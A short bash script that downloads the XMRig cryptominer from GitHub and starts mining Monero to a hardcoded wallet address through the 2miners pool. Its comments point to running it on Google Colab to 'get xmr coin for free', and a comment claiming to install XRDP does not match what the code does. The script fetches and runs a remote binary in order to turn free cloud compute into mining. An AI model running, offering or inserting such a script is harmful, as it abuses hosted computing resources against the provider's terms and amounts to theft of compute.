#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr

wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz
tar -xf xmrig-6.18.0-linux-static-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o xmr.2miners.com:2222 -u 427s5UBqGxtaxUgMFuYq5XhAFvWnRxmovSRqDBV9y9rqLarWm7xeUbLAS6un9c7zMuLwi3fyrZQNgRPQd8EfGWb2GbeAV5P --coin=XMR -k --tls --rig-id GC-US
